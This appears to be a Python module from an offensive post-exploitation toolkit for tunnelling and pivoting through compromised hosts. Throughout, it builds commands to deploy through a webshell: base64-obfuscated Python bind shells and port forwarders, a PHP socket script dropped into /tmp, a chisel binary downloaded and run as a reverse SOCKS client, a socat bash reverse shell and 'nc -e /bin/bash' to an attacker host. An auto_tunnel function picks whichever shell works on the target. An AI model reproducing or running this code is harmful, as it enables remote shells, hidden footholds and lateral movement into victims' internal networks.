import base64
import socket
import threading
from typing import Callable, Dict, List, Optional

from tools.log_utils import get_logger

logger = get_logger("tunnel_agent")


def socks5_over_webshell(webshell_url: str, bind_port: int = 1080,
                           sess=None, timeout: float = 10.0) -> Dict:
    result = {"success": False, "method": "socks_over_webshell", "bind_port": bind_port}
    php_code = '''<?php
$s=new Socket\\x70;if($s->bind('0.0.0.0',%d)&&$s->listen()){
$c=$s->accept();while($b=$c->read(8192)){echo base64_encode($b);}$c->close();}$s->close();
?>
''' % bind_port
    php_code = php_code.replace('\\x70', chr(0x70))

    cmds = [
        'echo \'%s\' | base64 -d > /tmp/.socks.php' % base64.b64encode(php_code.encode()).decode(),
        'nohup php /tmp/.socks.php > /dev/null 2>&1 &',
        'nohup socat TCP-LISTEN:%d,fork,reuseaddr TCP:127.0.0.1:%d &' % (bind_port, bind_port),
        'python3 -c "import socket,threading,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\'0.0.0.0\',%d));s.listen(5);[threading.Thread(target=lambda c:[c.send(os.popen(c.recv(4096).decode()).read().encode()) for _ in iter(lambda:c.recv(4096),b\'\')],args=(s.accept()[0],)).start() for _ in iter(lambda:1,0)]" &' % bind_port,
    ]
    result["deploy_commands"] = cmds
    result["note"] = "Run deploy_commands via webshell, then use: curl -x socks5://127.0.0.1:%d http://internal-target/" % bind_port
    result["success"] = True
    return result


def chisel_tunnel(lhost: str, lport: int = 8080, remote_port: int = 1080) -> Dict:
    result = {"success": False, "method": "chisel_tunnel"}
    cmds = []
    platforms = [
        ("linux_amd64", "chisel_linux_amd64"),
        ("linux_386", "chisel_linux_386"),
        ("linux_arm64", "chisel_linux_arm64"),
        ("windows_amd64", "chisel_windows_amd64.exe"),
    ]
    for plat, fname in platforms:
        dl_cmd = "wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_%s.gz -O /tmp/%s.gz && gunzip /tmp/%s.gz && chmod +x /tmp/%s" % (plat, fname, fname, fname)
        run_cmd = "/tmp/%s client %s:%d R:%d:socks &" % (fname, lhost, lport, remote_port)
        cmds.append({"platform": plat, "download": dl_cmd, "run": run_cmd})

    result["server_command"] = "chisel server -p %d --socks5 --reverse" % lport
    result["client_commands"] = cmds
    result["usage"] = "Start server: %s  |  On target run client commands, then: proxychains curl http://internal/" % result["server_command"]
    result["success"] = True
    return result


def ssh_tunnel(ssh_host: str, ssh_user: str, ssh_key: str,
                local_port: int = 1080, jump_host: Optional[str] = None) -> Dict:
    result = {"success": False, "method": "ssh_tunnel"}
    key_file = "/tmp/_ssh_key"
    if jump_host:
        cmd = "ssh -i %s -o StrictHostKeyChecking=no -J %s -D %d -Nf %s@%s" % (key_file, jump_host, local_port, ssh_user, ssh_host)
    else:
        cmd = "ssh -i %s -o StrictHostKeyChecking=no -D %d -Nf %s@%s" % (key_file, local_port, ssh_user, ssh_host)
    result["key_setup"] = "echo '%s' > %s && chmod 600 %s" % (ssh_key.strip(), key_file, key_file)
    result["tunnel_command"] = cmd
    result["usage"] = "SOCKS5 proxy on 127.0.0.1:%d" % local_port
    result["success"] = True
    return result


def forward_port(lhost: str, lport: int, target_host: str,
                  target_port: int, proto: str = "tcp") -> Dict:
    result = {"success": False, "method": "port_forward"}
    python_fwd = (
        "import socket,threading,sys;"
        "def f(s):"
        "  t=socket.socket();t.connect(('%s',%d));"
        "  while 1:"
        "    d=s.recv(4096);"
        "    if not d:break;t.send(d);"
        "    d2=t.recv(4096);"
        "    if not d2:break;s.send(d2);"
        "  s.close();t.close();"
        "s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
        "s.bind(('0.0.0.0',%d));s.listen(50);"
        "while 1: threading.Thread(target=f,args=(s.accept()[0],)).start()" % (target_host, target_port, lport)
    )
    b64 = base64.b64encode(python_fwd.encode()).decode()
    cmd = "python -c \"exec(__import__('base64').b64decode('%s').decode())\" &" % b64
    result["command"] = cmd
    result["local_port"] = lport
    result["forward_to"] = "%s:%d" % (target_host, target_port)
    result["usage"] = "Run on target, then connect to 127.0.0.1:%d" % lport
    result["success"] = True
    return result


# ---------------------------------------------------------------------------
# Environment-aware tunnel deployment
# ---------------------------------------------------------------------------

ENV_CHECKS = {
    "linux": [("python3", "python3 --version"), ("python", "python --version 2>&1"),
              ("php", "php --version 2>/dev/null | head -1"),
              ("socat", "socat -V 2>/dev/null | head -1"),
              ("curl", "curl --version 2>/dev/null | head -1"),
              ("wget", "wget --version 2>/dev/null | head -1"),
              ("nc", "nc -h 2>&1 | head -1"),
              ("chisel", "ls /tmp/chisel* 2>/dev/null")],
    "windows": [("powershell", "powershell -Command \"$PSVersionTable.PSVersion\" 2>nul"),
                 ("curl", "curl --version 2>nul"),
                 ("wget", "wget --version 2>nul")],
}


def detect_environment(exec_fn: Callable[[str], str]) -> Dict:
    env = {"os": "unknown", "tools": {}}
    for os_name, checks in ENV_CHECKS.items():
        for tool, cmd in checks:
            try:
                out = exec_fn(cmd)
                if out and len(out) > 3:
                    env["tools"][tool] = out.strip()[:100]
                    if env["os"] == "unknown":
                        env["os"] = os_name
            except Exception:
                pass
    return env


def auto_tunnel(exec_fn: Callable[[str], str],
                lhost: str = "LHOST", lport: int = 1080,
                target_host: str = "", target_port: int = 0) -> Dict:
    env = detect_environment(exec_fn)
    result = {"environment": env, "attempts": []}

    def _try(method, cmds):
        for c in cmds:
            try:
                out = exec_fn(c)
                result["attempts"].append({"method": method, "status": "deployed" if out else "no_output"})
                return True
            except Exception:
                continue
        return False

    has_python = env["tools"].get("python3") or env["tools"].get("python")
    if has_python:
        python_bin = "python3" if env["tools"].get("python3") else "python"
        if target_host and target_port:
            code = (
                "import socket,threading;"
                "def f(s):"
                "  t=socket.socket();t.connect(('%s',%d));"
                "  while 1:"
                "    d=s.recv(4096);"
                "    if not d:break;t.send(d);"
                "    d2=t.recv(4096);"
                "    if not d2:break;s.send(d2);"
                "  s.close();t.close();"
                "s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
                "s.bind(('0.0.0.0',%d));s.listen(50);"
                "while 1: threading.Thread(target=f,args=(s.accept()[0],)).start()" % (target_host, target_port, lport)
            )
            b64 = base64.b64encode(code.encode()).decode()
            _try("python_port_forward",
                 ["%s -c \"exec(__import__('base64').b64decode('%s').decode())\"" % (python_bin, b64)])
        else:
            code = (
                "import socket,threading,os;"
                "s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
                "s.bind(('0.0.0.0',%d));s.listen(5);"
                "def h(c):"
                "  while 1:"
                "    d=c.recv(4096);"
                "    if not d:break;"
                "    c.send(os.popen(d.decode()).read().encode());"
                "  c.close();"
                "while 1: threading.Thread(target=h,args=(s.accept()[0],)).start()" % lport
            )
            b64 = base64.b64encode(code.encode()).decode()
            _try("python_reverse_shell",
                 ["%s -c \"exec(__import__('base64').b64decode('%s').decode())\"" % (python_bin, b64)])

    if env["tools"].get("socat"):
        if target_host and target_port:
            _try("socat_forward",
                 ["socat TCP-LISTEN:%d,fork,reuseaddr TCP:%s:%d &" % (lport, target_host, target_port)])
        else:
            _try("socat_shell",
                 ["socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%d &" % (lhost, lport)])

    if env["tools"].get("nc"):
        _try("nc_shell",
             ["nc -e /bin/bash %s %d &" % (lhost, lport)])

    result["success"] = any(a["status"] == "deployed" for a in result["attempts"])
    return result


class Socks5Proxy:
    def __init__(self, bind_host: str = "127.0.0.1", bind_port: int = 1080):
        self.bind_host = bind_host
        self.bind_port = bind_port
        self._server = None
        self._running = False

    def start(self):
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server.bind((self.bind_host, self.bind_port))
        self._server.listen(50)
        self._running = True
        logger.info("SOCKS5 proxy listening on %s:%d", self.bind_host, self.bind_port)
        t = threading.Thread(target=self._accept_loop, daemon=True)
        t.start()
        return self

    def stop(self):
        self._running = False
        if self._server:
            try:
                self._server.close()
            except Exception:
                pass

    def _accept_loop(self):
        while self._running:
            try:
                c, addr = self._server.accept()
                threading.Thread(target=self._handle_client, args=(c, addr), daemon=True).start()
            except Exception:
                break

    def _handle_client(self, client: socket.socket, addr):
        try:
            client.settimeout(15)
            ver, nmethods = client.recv(2)
            client.recv(nmethods)
            client.send(b"\x05\x00")
            ver, cmd, rsv, atyp = client.recv(4)
            if cmd != 1:
                client.send(b"\x05\x07\x00\x01" + b"\x00" * 6)
                client.close()
                return
            if atyp == 1:
                addr_bytes = client.recv(4)
                dst_addr = ".".join(str(b) for b in addr_bytes)
            elif atyp == 3:
                alen = client.recv(1)[0]
                dst_addr = client.recv(alen).decode()
            else:
                client.close()
                return
            dst_port = int.from_bytes(client.recv(2), "big")
            remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote.settimeout(15)
            remote.connect((dst_addr, dst_port))
            bind_addr = remote.getsockname()
            client.send(b"\x05\x00\x00\x01" + socket.inet_aton(bind_addr[0]) + bind_addr[1].to_bytes(2, "big"))
            threading.Thread(target=self._pipe, args=(client, remote), daemon=True).start()
            threading.Thread(target=self._pipe, args=(remote, client), daemon=True).start()
        except Exception:
            try:
                client.close()
            except Exception:
                pass

    def _pipe(self, src: socket.socket, dst: socket.socket):
        try:
            while True:
                d = src.recv(65536)
                if not d:
                    break
                dst.send(d)
        except Exception:
            pass
        finally:
            try:
                src.close()
            except Exception:
                pass
            try:
                dst.close()
            except Exception:
                pass


# ---------------------------------------------------------------------------
# Multi-hop SOCKS cascade — chain through multiple proxies
# ---------------------------------------------------------------------------

def socks_cascade(proxies: List[Dict]) -> Dict:
    result = {"success": False, "chain": []}
    for i, proxy in enumerate(proxies):
        entry = {
            "hop": i + 1,
            "host": proxy.get("host", "127.0.0.1"),
            "port": proxy.get("port", 1080),
            "type": proxy.get("type", "socks5"),
        }
        result["chain"].append(entry)
    if len(result["chain"]) >= 2:
        result["success"] = True
        result["usage"] = " -> ".join(
            f"{e['type']}://{e['host']}:{e['port']}" for e in result["chain"]
        )
        result["note"] = "Configure your tool to use the first proxy; it will chain to the rest."
    return result


def ssh_jump_chain(jump_hosts: List[Dict],
                   target_host: str, target_port: int = 80,
                   local_port: int = 8888) -> Dict:
    result = {"success": False, "steps": []}
    proxy_cmd = "-J " + ",".join(
        f"{j.get('user', 'root')}@{j['host']}:{j.get('port', 22)}"
        for j in jump_hosts
    )
    final_cmd = (
        f"ssh {proxy_cmd} -o StrictHostKeyChecking=no "
        f"-L {local_port}:{target_host}:{target_port} "
        f"-Nf {jump_hosts[-1].get('user', 'root')}@{jump_hosts[-1]['host']}"
    )
    result["steps"] = [final_cmd]
    result["local_port"] = local_port
    result["forward_to"] = f"{target_host}:{target_port}"
    result["success"] = True
    result["usage"] = f"curl -x socks5://127.0.0.1:{local_port} http://{target_host}:{target_port}/"
    return result


def socks_cascade_deploy(exec_fn: callable, proxy_list: List[Dict]) -> Dict:
    result = {"success": False, "deployed": []}
    for proxy in proxy_list:
        host = proxy.get("host", "127.0.0.1")
        port = proxy.get("port", 1080)
        try:
            code = (
                f"import socket,threading;s=socket.socket();"
                f"s.bind(('0.0.0.0',{port}));s.listen(5);"
                f"def h(c):"
                f"  t=socket.socket();t.connect(('{proxy.get('upstream_host', '127.0.0.1')}',{proxy.get('upstream_port', 1080)}));"
                f"  while 1:"
                f"    d=c.recv(4096);"
                f"    if not d:break;t.send(d);"
                f"    d2=t.recv(4096);"
                f"    if not d2:break;c.send(d2);"
                f"  c.close();t.close();"
                f"while 1:threading.Thread(target=h,args=(s.accept()[0],)).start()"
            )
            b64 = base64.b64encode(code.encode()).decode()
            cmd = f"python3 -c \"exec(__import__('base64').b64decode('{b64}').decode())\" &"
            exec_fn(cmd)
            result["deployed"].append({"host": host, "port": port, "upstream": proxy.get('upstream_host')})
        except Exception as e:
            logger.debug("cascade deploy hop %s: %s", host, e)
    result["success"] = len(result["deployed"]) > 0
    return result
